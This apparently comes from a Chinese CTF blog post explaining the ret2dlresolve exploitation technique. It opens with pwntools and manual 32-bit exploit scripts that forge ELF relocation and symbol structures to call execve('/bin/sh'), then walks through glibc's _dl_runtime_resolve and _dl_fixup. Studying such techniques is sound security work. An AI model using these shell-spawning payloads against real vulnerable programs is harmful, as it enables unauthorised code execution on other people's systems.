---
title: Ret2dlresolve
date: 2021-06-18 14:49:43
tags:
layout: post
----
Ret2dlresolve
<!--more-->
# Prologue

之前搞明白了一年没打ctf就全忘了，重新复习下，顺便学习了直接用 `Ret2dlresolvePayload`

# Cheat sheet

自动：

```cpp
rop = ROP("./pwn")
elf = ELF("./pwn")
dlresolve = Ret2dlresolvePayload(elf,symbol="execve",args=["/bin/sh",0,0])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
pad=0
payload ='\0'*pad+str(rop)
p.send(payload.ljust(0x100))
p.send(dlresolve.payload)
```

手动：

```python
#32
bss = 0x0804a000
pad = 0x2c
read = 0x80482e0
plt_0 = 0x80482d0
bss = bss + 0x800
strtab =0x804821c
symtab =0x80481cc
rela_plt = 0x8048298
ppp=0x080484a9

payload = '\0'*pad+flat([read,ppp,0,bss,0x200])#+p64(rdx)+p64(0x100)
payload+= flat([plt_0,(bss-rela_plt)],0xdeadbeef,bss+0x58,0,0)

p.send(payload.ljust(0x200))
fake=[
    bss+0x100,
    ((((bss+0x0c-symtab)/0x10))<<8)+7,
    0,#elf64_rela end
    (0x50+bss-strtab),
    0,
    0,
    0x12,#elf64_sym end
    ]
payload= flat(fake).ljust(0x50,'\0')+"execve\0\0"+"/bin/sh\0"
```

主要就是构造两个结构体 rela 和 sym，64位时有个讨厌的version，32位比较方便。

rela ：

在32位时0xc ，_dl_runtime_resolve 的参数不是index而是offset；

在64位时0x18，_dl_runtime_resolve参数是index

sym：

在32位时0x10，64位0x18 都是将rela的第一个域处理后当作index。

# _dl_runtime_resolve

ps - >建议编译一个带符号的libc之后进去调试，下文举例用64位计算。

从入口函数 `_dl_runtime_resolve` 开始。这个函数是已经push传参的。

```cpp
//https://code.woboq.org/userspace/glibc/sysdeps/i386/dl-trampoline.S.html
_dl_runtime_resolve:
        cfi_adjust_cfa_offset (8)
        _CET_ENDBR
        pushl %eax                # Preserve registers otherwise clobbered.
        cfi_adjust_cfa_offset (4)
        pushl %ecx
        cfi_adjust_cfa_offset (4)
        pushl %edx
        cfi_adjust_cfa_offset (4)
        movl 16(%esp), %edx        # Copy args pushed by PLT in register.  Note
        movl 12(%esp), %eax        # that `fixup' takes its parameters in regs.
        call _dl_fixup                # Call resolver.
        popl %edx                # Get register content back.
        cfi_adjust_cfa_offset (-4)
        movl (%esp), %ecx
        movl %eax, (%esp)        # Store the function address.
        movl 4(%esp), %eax
        ret $12                        # Jump to function address.
```

`_dl_runtime_resolve` 也没啥就是参数设置call 了 `_dl_fixup`

其定义为： `_dl_fixup ( # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS, # endif struct link_map *l, ElfW(Word) reloc_arg)`

1. `link_map`  结构体定义非常长想看的可以走这里[https://code.woboq.org/userspace/glibc/include/link.h.html#link_map](https://code.woboq.org/userspace/glibc/include/link.h.html#link_map)
2. 这个`link_map`  是可以call plt+0来填入的所以攻击的时候不用管
3. `reloc_arg` 参数是一个index，表示的是 `.rela.plt` 的offset
4. 功能为函数`_dl_fixup` ，其源码如下：

# _dl_fixup

```cpp
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
           ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
           struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;
  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
        {
          const ElfW(Half) *vernum =
            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
          version = &l->l_versions[ndx];
          if (version->hash == 0)
            version = NULL;
        }
      /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
        {
          THREAD_GSCOPE_SET_FLAG ();
          flags |= DL_LOOKUP_GSCOPE_LOCK;
        }
#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
        THREAD_GSCOPE_RESET_FLAG ();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif
      /* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
                                   SYMBOL_ADDRESS (result, sym, false));
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
         address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));
      result = l;
    }
  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);
  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```

在函数开头的几行中确定了一些表的位置，需要注意的是 strtab 储存着函数名字符串，strtab是一个 `elf64_sym` 的数组，reloc是 `Elf64_Rela` 结构体

```c
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
```

```c
typedef struct elf32_sym{
Elf32_Word st_name;
Elf32_Addr st_value;
Elf32_Word st_size;
unsigned charst_info;
unsigned charst_other;
Elf32_Half st_shndx;
}Elf32_Sym;

typedef struct elf64_sym {
Elf64_Word st_name;/* Symbol name, index in string tbl */
unsigned charst_info;/* Type and binding attributes */
unsigned charst_other;/* No defined meaning, 0 */
Elf64_Half st_shndx;/* Associated section index */
Elf64_Addr st_value;/* Value of the symbol */
Elf64_Xword st_size;/* Associated symbol size */}Elf64_Sym;
```

```c
typedef struct elf32_rela{
  Elf32_Addr	r_offset;
  Elf32_Word	r_info;
  Elf32_Sword	r_addend;
} Elf32_Rela;

typedef struct elf64_rela {
  Elf64_Addr r_offset;	/* Location at which to apply the action */
  Elf64_Xword r_info;	/* index and type of relocation */
  Elf64_Sxword r_addend;	/* Constant addend used to compute value */
} Elf64_Rela;

```

在之后的过程中我们需要构造两个假的结构体 `rela` and `Sym`:

1. 伪造一个rela时需要注意的域是 `r_offse` and `r_info`  ，值得一提的是:
    - `r_info`的计算方法是 `(index<<0x20)+ 0x7` 这里的index是伪造的sym相对于symtab的序号
    - `r_offset` 是got，在做hijack的时候随便写一个可写地址就行，反正不需要回去。
    - `.rela.plt` 可以通过 `readelf -a` 获得，rela结构体64位下0x18字节.
2. 伪造一个`Sym`时需要注意的是 
    - `symtab` 是一个 `Elf64_Sym`的数组，结构体大小为0x18:
    - 其中重要的是 `st_name`表示的是函数名在 `strtab`中的 `offset`
    - 剩下的位置抄已有的sym就行

# _dl_lookup_symbol_x

重定位依靠函数`_dl_lookup_symbol_x`：

`result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);`

前面的准备工作做好后开始构造，`_dl_lookup_symbol_x`第一个参数是函数名指针：`strtab` + `sym->st_name` 

结合前面内容：

`reloc` = `.rela.plt` + 0x18* `传入参数`

`sym` = [0x18 * (`(reloc->r_info)>>0x20`)]+symtab

所以我们需要在已知地址构造两个结构体 `elf64_rela` 和 `elf64_sym`

和 `system`的字符串。

至此，可以直接call system，参数需要先在rdi中放着。